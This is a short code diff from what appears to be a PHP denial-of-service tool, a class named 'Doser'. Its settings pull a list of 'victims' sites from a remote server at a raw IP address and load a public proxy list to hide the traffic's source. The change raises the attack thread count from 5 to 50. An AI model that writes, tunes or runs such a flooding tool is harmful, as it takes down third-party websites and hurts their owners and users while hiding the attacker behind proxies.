@@ -4,7 +4,7 @@ class Doser {
 	var $source='http://164.92.247.88:9300/victims'; //список сайтов в json
 	var $proxylist='https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/proxy.txt'; // список прокси с гитхаба
 	var $useProxy=true;
-	var $threads=5;
+	var $threads=50;
 	var $showResult=0;
 	var $pages;
 	var $proxy;
